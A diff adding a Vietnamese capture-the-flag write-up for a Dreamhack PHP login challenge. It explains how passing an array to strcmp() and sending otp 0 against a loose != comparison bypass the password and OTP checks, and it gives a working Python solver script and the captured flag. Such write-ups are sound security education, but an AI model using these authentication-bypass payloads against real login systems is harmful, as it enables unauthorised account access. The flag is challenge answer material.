@@ -124,3 +124,43 @@ function login() {
 $flag = "testflag";
 ?>
 ```
+
+#### Phân tích: ` if (!strcmp($cred['pw'], $GLOBALS['admin_pw']))`
+`strcmp()` được thiết kế để so sánh hai chuỗi. Do đó nếu đưa cho nó một mảng, `strcmp()` sẽ bị lỗi, trả về `NULL`
+Khi đó:
+- `strcmp([], "random_password")` ➔ NULL
+- `!NULL` ➔ true
+
+===> Ta sẽ gửi `pw: []` để `if (true)` luôn đúng và vượt qua phần kiểm tra password.  
+
+#### Phân tích: `if ($cred['otp'] != $GLOBALS['otp'])`
+```python
+function generateOTP() {
+    return 'P' . str_pad(strval(random_int(0, 999999)), 6, "0", STR_PAD_LEFT);
+}
+```
+
+===> OTP luôn bắt đầu bằng chữ **P**  
+
+Với phép so sánh `!=`, khi so sánh một số với một chuỗi bắt đầu bằng chữ, nó sẽ ép chuỗi đó về **0**  
+Khi đó:
+- Ta gửi `otp: 0`
+- Server so sánh: `0 != "P123456"`  <=>  `0 != 0`
+- Kết quả là `false`
+  
+===> `if` không được thực thi, vượt qua phần kiểm tra OTP.
+  
+Tạo file `solver.py` để thực thi kế hoạch trên
+```python
+import requests
+import json
+import base64
+
+url = "http://host8.dreamhack.games:11388/"
+payload = {"id":"admin","pw":[],"otp":0}
+cred = base64.b64encode(json.dumps(payload).encode()).decode()
+response = requests.post(url, data={"cred": cred})
+print(response.text)
+```
+
+Dùng cmd để chạy code và ta có được flag: `DH{85256d8e59d3603651c9053572506e088d8a953e0faa59f769afd1745b09a618}`
